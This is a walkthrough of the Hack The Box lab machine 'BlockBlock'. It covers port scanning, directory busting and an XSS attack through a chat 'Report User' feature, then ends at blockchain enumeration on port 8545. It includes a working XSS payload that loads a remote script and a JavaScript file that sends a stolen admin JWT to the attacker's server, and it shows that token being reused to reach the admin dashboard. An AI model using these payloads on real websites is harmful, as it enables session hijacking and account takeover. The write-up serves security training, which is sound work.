---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - CrossSiteScripting
  - XSS
  - CookieStealing
  - ClientSide
  - JSONWebToken
  - JWT
  - Blockchain
  - JSONRPC
  - Foundry
  - pacman
---

![](images/BlockBlock.png)

## Summary

The box starts with `Cross-Site Scripting (XSS)` within a `Report User` function in a `chat` which is build upon a `blockchain`. Abusing this `function` ends up in `cookie stealing` which provides access to a `admin dashboard`. The dashboard then reveals a `username` called `keira` and a `endpoint` for the `API` called `/api/json-rpc`. The `endpoint` then provides an `authorization token` for an `authenticated user` with which the previously stolen `cookie` can be signed to interact with the `blockchain` running on port `8545/TCP`. Iterating through the `blockchain` provides an huge amount of `data` in `HEX` format. In there the `password` for `keira` is stored in `plaintext`. This gives `foothold` on the box and `access` to the `user.txt`. From there on `enumeration` shows another `user` called `paul`. To `escalate privilges` to `paul` the `abuse` of a `custom Solidity Compiler (solc)` within `Foundry` is required. As `paul` another `sudo permission abuse` leads to `privilege escalation` to get `root` by `crafting`, `packing` and `installing` a `malicious pacman package`.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Directory Busting](#Directory-Busting)
    - [Enumerating Chat](#Enumerating-Chat)
- [Cross-Site Scripting (XSS)](#Cross-Site-Scripting-XSS)
    - [Steal Admin Token](#Steal-Admin-Token)
- [Admin Dashboard](#Admin-Dashboard)
- [Blockchain Enumeration](#Blockchain-Enumeration)
    - [Interacting with the Blockchain](#Interacting-with-the-Blockchain)
        - [Signing the Token](#Signing-the-Token)
        - [Blockchain Enumeration](#Blockchain-Enumeration)
- [Foothold](#Foothold)
    - [Decode Blockchain Data](#Decode-Blockchain-Data)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to paul](#Privilege-Escalation-to-paul)
    - [Abusing custom Solidity Compiler](#Abusing-custom-Solidity-Compiler)
- [Pivoting](#Pivoting)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Abusing pacman Packages](#Abusing-pacman-Packages)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

As usual we started the box with `port scanning` using `Nmap`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.231.122
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 20:01 CET
Nmap scan report for 10.129.231.122
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:02:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 275864
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     Home - DBLC
|     </title>
|     <link rel="stylesheet" href="/assets/nav-bar.css">
|     </head>
|     <body>
|     <!-- <main> -->
|     <meta charset=utf-8>
|     <meta name=viewport content="width=device-width, initial-scale=1">
|     <style>
|     :after,
|     :before {
|     box-sizing: border-box;
|     border: 0 solid #e5e7eb
|     :after,
|     :before {
|     --tw-content: ""
|     :host,
|     html {
|     line-height: 1.5;
|   HTTPOptions: 
|     HTTP/1.1 500 INTERNAL SERVER ERROR
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:02:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 265
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>500 Internal Server Error</title>
|     <h1>Internal Server Error</h1>
|_    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
|_http-title:          Home  - DBLC    
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=11/16%Time=6738EC2C%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,25A4,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20Nov\x202024\x2019:02:04\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20275864\r\nAccess-Control-Allow-Origin:\x20http://0\.0\.0\.0/\r\nAcc
SF:ess-Control-Allow-Headers:\x20Content-Type,Authorization\r\nAccess-Cont
SF:rol-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\n<head>\n\x20\x20\x20\x20<title>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20Home\x20\x20-\x20DBLC\n\x20\x20\x
SF:20\x20</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:assets/nav-bar\.css\">\n</head>\n\n<body>\n\x20\x20\x20\x20\n\n\x20\x20
SF:\x20\x20<!--\x20<main>\x20-->\n\x20\x20\x20\x20\n\x20\x20\x20\x20<meta\
SF:x20charset=utf-8>\n\x20\x20\x20\x20<meta\x20name=viewport\x20content=\"
SF:width=device-width,\x20initial-scale=1\">\n\x20\x20\x20\x20<style>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\*,\n\x20\x20\x20\x20\x20\x20\x20\x20:afte
SF:r,\n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20box-sizing:\x20border-box;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20border:\x200\x20solid\x20#e5e7eb\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:after,
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20--tw-content:\x20\"\"\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:host,\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.5;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20")%r(
SF:HTTPOptions,26D,"HTTP/1\.1\x20500\x20INTERNAL\x20SERVER\x20ERROR\r\nSer
SF:ver:\x20Werkzeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20N
SF:ov\x202024\x2019:02:04\x20GMT\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nContent-Length:\x20265\r\nAccess-Control-Allow-Origin:\x20htt
SF:p://0\.0\.0\.0/\r\nAccess-Control-Allow-Headers:\x20Content-Type,Author
SF:ization\r\nAccess-Control-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS
SF:\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n
SF:<title>500\x20Internal\x20Server\x20Error</title>\n<h1>Internal\x20Serv
SF:er\x20Error</h1>\n<p>The\x20server\x20encountered\x20an\x20internal\x20
SF:error\x20and\x20was\x20unable\x20to\x20complete\x20your\x20request\.\x2
SF:0Either\x20the\x20server\x20is\x20overloaded\x20or\x20there\x20is\x20an
SF:\x20error\x20in\x20the\x20application\.</p>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.02 seconds
```

Besides port `80/TCP` we also found port `8545/TCP` which we later needed to interact with the `Blockchain` through `JSON-RPC`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.231.122
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 20:06 CET
Nmap scan report for 10.129.231.122
Host is up (0.022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-title:          Home  - DBLC    
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:06:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 275864
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     Home - DBLC
|     </title>
|     <link rel="stylesheet" href="/assets/nav-bar.css">
|     </head>
|     <body>
|     <!-- <main> -->
|     <meta charset=utf-8>
|     <meta name=viewport content="width=device-width, initial-scale=1">
|     <style>
|     :after,
|     :before {
|     box-sizing: border-box;
|     border: 0 solid #e5e7eb
|     :after,
|     :before {
|     --tw-content: ""
|     :host,
|     html {
|     line-height: 1.5;
|   HTTPOptions: 
|     HTTP/1.1 500 INTERNAL SERVER ERROR
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:06:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 265
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>500 Internal Server Error</title>
|     <h1>Internal Server Error</h1>
|_    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
8545/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 BAD REQUEST
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:06:21 GMT
|     content-type: text/plain; charset=utf-8
|     Content-Length: 43
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-origin: *
|     date: Sat, 16 Nov 2024 19:06:21 GMT
|     Connection: close
|     Connection header did not include 'upgrade'
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 16 Nov 2024 19:06:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, POST, HEAD
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Connection: close
|   Help: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=11/16%Time=6738ED2D%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,97C4,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20Nov\x202024\x2019:06:21\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20275864\r\nAccess-Control-Allow-Origin:\x20http://0\.0\.0\.0/\r\nAcc
SF:ess-Control-Allow-Headers:\x20Content-Type,Authorization\r\nAccess-Cont
SF:rol-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\n<head>\n\x20\x20\x20\x20<title>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20Home\x20\x20-\x20DBLC\n\x20\x20\x
SF:20\x20</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:assets/nav-bar\.css\">\n</head>\n\n<body>\n\x20\x20\x20\x20\n\n\x20\x20
SF:\x20\x20<!--\x20<main>\x20-->\n\x20\x20\x20\x20\n\x20\x20\x20\x20<meta\
SF:x20charset=utf-8>\n\x20\x20\x20\x20<meta\x20name=viewport\x20content=\"
SF:width=device-width,\x20initial-scale=1\">\n\x20\x20\x20\x20<style>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\*,\n\x20\x20\x20\x20\x20\x20\x20\x20:afte
SF:r,\n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20box-sizing:\x20border-box;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20border:\x200\x20solid\x20#e5e7eb\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:after,
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20--tw-content:\x20\"\"\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:host,\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.5;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20")%r(
SF:HTTPOptions,26D,"HTTP/1\.1\x20500\x20INTERNAL\x20SERVER\x20ERROR\r\nSer
SF:ver:\x20Werkzeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20N
SF:ov\x202024\x2019:06:21\x20GMT\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nContent-Length:\x20265\r\nAccess-Control-Allow-Origin:\x20htt
SF:p://0\.0\.0\.0/\r\nAccess-Control-Allow-Headers:\x20Content-Type,Author
SF:ization\r\nAccess-Control-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS
SF:\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n
SF:<title>500\x20Internal\x20Server\x20Error</title>\n<h1>Internal\x20Serv
SF:er\x20Error</h1>\n<p>The\x20server\x20encountered\x20an\x20internal\x20
SF:error\x20and\x20was\x20unable\x20to\x20complete\x20your\x20request\.\x2
SF:0Either\x20the\x20server\x20is\x20overloaded\x20or\x20there\x20is\x20an
SF:\x20error\x20in\x20the\x20application\.</p>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8545-TCP:V=7.94SVN%I=7%D=11/16%Time=6738ED2D%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,174,"HTTP/1\.1\x20400\x20BAD\x20REQUEST\r\nServer:\x20Werk
SF:zeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20Nov\x202024\x
SF:2019:06:21\x20GMT\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nC
SF:ontent-Length:\x2043\r\nvary:\x20origin,\x20access-control-request-meth
SF:od,\x20access-control-request-headers\r\naccess-control-allow-origin:\x
SF:20\*\r\ndate:\x20Sat,\x2016\x20Nov\x202024\x2019:06:21\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\nConnection\x20header\x20did\x20not\x20include\x20
SF:'upgrade'")%r(HTTPOptions,ED,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werk
SF:zeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2016\x20Nov\x202024\x
SF:2019:06:21\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAl
SF:low:\x20OPTIONS,\x20GET,\x20POST,\x20HEAD\r\nAccess-Control-Allow-Origi
SF:n:\x20\*\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RT
SF:SPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\
SF:x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20
SF:\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x2
SF:0Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n")%r(Help,167,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\
SF:">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20ch
SF:arset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respo
SF:nse</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Message:\x20Bad\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x
SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x
SF:20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.72 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.231.122
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 20:13 CET
Nmap scan report for 10.129.231.122
Host is up (0.021s latency).
Not shown: 992 closed udp ports (port-unreach)
PORT      STATE         SERVICE  VERSION
518/udp   open|filtered ntalk
1433/udp  open|filtered ms-sql-s
20679/udp open|filtered unknown
38412/udp open|filtered unknown
40724/udp open|filtered unknown
43514/udp open|filtered unknown
45928/udp open|filtered unknown
61685/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1223.12 seconds
```

### Enumeration of Port 80/TCP

While the `port scans` were running, we investigated the `website` running on port `80/TCP`.

- [http://10.129.231.122/](http://10.129.231.122/)

There were a few interesting `HTTP Headers` set we came along later.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.231.122/
http://10.129.231.122/ [200 OK] Access-Control-Allow-Methods[GET,POST,PUT,DELETE,OPTIONS], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.12.3], IP[10.129.231.122], Python[3.12.3], Script, Title[Home  - DBLC][Title element contains newline(s)!], UncommonHeaders[access-control-allow-origin,access-control-allow-headers,access-control-allow-methods], Werkzeug[3.0.3]
```

The `website` was build to provide a `Chat` based on a `Blockchain`.

![](images/2024-11-16_20-03_80_website.png)

![](images/2024-11-16_20-04_80_register.png)

![](images/2024-11-16_20-05_80_login.png)

We also found two interesting `API endpoints` called `chat` and `profile`.

![](images/2024-11-16_20-05_80_chat.png)

![](images/2024-11-16_20-05_80_profile.png)

### Directory Busting

In addition to our `reconnaissance` we started `directory busting` and found two more endpoints.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.5.109/api/

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 26583

Output File: /home/kali/reports/http_10.129.5.109/_api__24-11-22_16-04-02.txt

Target: http://10.129.5.109/

[16:04:02] Starting: api/                                                                                                                                                                                                                   
[16:04:25] 401 -   35B  - /api/info
[16:04:58] 200 -   16B  - /api/health
<--- CUT FOR BREVITY --->
```

Both lead nowhere at this point so we decided to save them for later.

```c
/api/info
/api/health
```

### Enumerating Chat

After we finished checking all the options the `website` was giving to us, we created an account and logged in.

| Username | Password |
| -------- | -------- |
| foobar   | foobar   |

We got greeted by a `BOT` and offered several options like `report a user` and `checking our profile`.

![](images/2024-11-16_20-09_80_chat_user_account.png)

![](images/2024-11-16_20-10_80_profile_user_account.png)

There was also a `endpoint` called `contract_source` which provided some sort of information based on the `Blockchain`.

![](images/2024-11-16_20-11_80_smart_contracts.png)

## Cross-Site Scripting (XSS)

We headed back to the `chat` and tested if we could leverage the `Report User` function to get `Cross-Site Scripting (XSS)` to work. And indeed after a few tries we had a `payload` forged that gave us a `callback`.

```c
<img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://10.10.14.86/x'; document.body.appendChild(s);">
```

![](images/2024-11-22_15-43_80_chat_report_user.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BlockBlock/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.109 - - [22/Nov/2024 15:44:52] code 404, message File not found
10.129.5.109 - - [22/Nov/2024 15:44:52] "GET /x HTTP/1.1" 404 -
```

### Steal Admin Token

As next step we tried to `steal` the `token` of some other `users` on the system. Therefore we build a small `JavaScript` file to host on our local machine.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BlockBlock/serve]
└─$ cat x.js 
(function() {
    // Fetch the admin token from /api/info
    fetch('/api/info')
        .then(response => response.json())
        .then(data => {
            // Extract the token (modify key based on API response structure)
            var token = data.adminToken || data.token || JSON.stringify(data);

            // Exfiltrate the token to your server
            var img = new Image();
            img.src = 'http://10.10.14.86/?token=' + encodeURIComponent(token);
        })
        .catch(err => {
            console.error('Error fetching token:', err);
        });
})();
```

We appended the extension `.js` to our `payload` and repeated the step before.

```c
<img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://10.10.14.86/x.js'; document.body.appendChild(s);">
```

Just immediately we received the `callback` with a `JSON Web Token (JWT)` in it.

```c
10.129.5.109 - - [22/Nov/2024 16:00:27] "GET /x.js HTTP/1.1" 200 -
10.129.5.109 - - [22/Nov/2024 16:00:27] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI4NzYyNywianRpIjoiMjkxYzM2ZGEtOGUxYi00OWQwLThlZjctNTQ4ODMwNjlmZmYzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjg3NjI3LCJleHAiOjE3MzI4OTI0Mjd9.cqmJAZdxppFBDTrH1GQMQHIYu5B6ExC2xoGeV1v1KDc HTTP/1.1" 200 -
```

```c
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI4NzYyNywianRpIjoiMjkxYzM2ZGEtOGUxYi00OWQwLThlZjctNTQ4ODMwNjlmZmYzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjg3NjI3LCJleHAiOjE3MzI4OTI0Mjd9.cqmJAZdxppFBDTrH1GQMQHIYu5B6ExC2xoGeV1v1KDc
```

To switch the `context` of our `current session` it was necessary to `update` the existing `token`.

![](images/2024-11-22_16-01_80_chat_admin.png)

And after `reloading` the page we got access to the `dashboard` of the user `admin`.

![](images/2024-11-22_16-06_80_chat_admin_dashboard.png)

## Admin Dashboard

On the `dashboart` itself we found a username called `keira`.

![](images/2024-11-22_16-06_80_chat_admin_users.png)

| Username |
| -------- |
| keira    |

We `refreshed` and `intercepted` the `traffic` to have a closer look at it.

```c
GET /admin HTTP/1.1
Host: 10.129.5.109
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.5.109/chat
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI4NzYyNywianRpIjoiMjkxYzM2ZGEtOGUxYi00OWQwLThlZjctNTQ4ODMwNjlmZmYzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjg3NjI3LCJleHAiOjE3MzI4OTI0Mjd9.cqmJAZdxppFBDTrH1GQMQHIYu5B6ExC2xoGeV1v1KDc
Connection: keep-alive


```

In the `response` we found another `endpoint` called `/api/json-rpc` and also more information about the `endpoint` we found earlier, `/api/info`.

```c
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Fri, 22 Nov 2024 15:07:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5492
Access-Control-Allow-Origin: http://10.129.5.109/
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Connection: close

<!DOCTYPE html>
<html>

<head>
    <title>
        Admin - DBLC
    </title>
    <link rel="stylesheet" href="/assets/nav-bar.css">
</head>

<--- CUT FOR BREVITY --->

    <script src="/assets/web3.min.js">

    </script>
    <script>
        (async () => {
            const jwtSecret = await (await fetch('/api/json-rpc')).json();
            const web3 = new Web3(window.origin + "/api/json-rpc");
            const postsCountElement = document.getElementById('chat-posts-count');
            let chatAddress = await (await fetch("/api/chat_address")).text();
            let postsCount = 0;
            chatAddress = (chatAddress.replace(/[\n"]/g, ""));

            // })();
            // (async () => {
            //     let jwtSecret = await (await fetch('/api/json-rpc')).json();

            let balance = await fetch(window.origin + "/api/json-rpc", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    "token": jwtSecret['Authorization'],
                },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    method: "eth_getBalance",
                    params: [chatAddress, "latest"],
                    id: 1
                })
            });
            let bal = (await balance.json()).result // || '0';
            console.log(bal)
            document.getElementById('donations').innerText = "$" + web3.utils.fromWei(bal,
                'ether')

<--- CUT FOR BREVITY --->

    <script>
        // check if logged in

        fetch('/api/info', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        }).then(response => {
            if (response.status != 200) {
                document.getElementById('login-status').innerHTML = "<a href='/login'>Login</a>"

            }
            else {
                document.getElementById('login-status').innerHTML = "<a href='/logout'>Logout</a>"
            }
        });

    </script>
</body>

</html>
```

![](images/2024-11-22_16-09_80_chat_admin_users_request.png)

When we then accessed the `endpoint` for `/api/json-rpc` we found an `Authorization Token`.

![](images/2024-11-22_16-14_80_chat_admin_api_json_rpc.png)

```c
{"Authorization":"c95c630c43cb43f9c5c3ae2c5d0ea186524e8641161fb10da7c963babb18991c"}
```

## Blockchain Enumeration

Then we proceed with checking port `8545/TCP` so see if we could interact with the `Blockchain`.

- [http://10.129.231.122:8545/](http://10.129.231.122:8545/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.231.122:8545/
http://10.129.231.122:8545/ [400 Bad Request] Country[RESERVED][ZZ], HTTPServer[Werkzeug/3.0.3 Python/3.12.3], IP[10.129.231.122], Python[3.12.3], UncommonHeaders[access-control-allow-origin], Werkzeug[3.0.3]
```

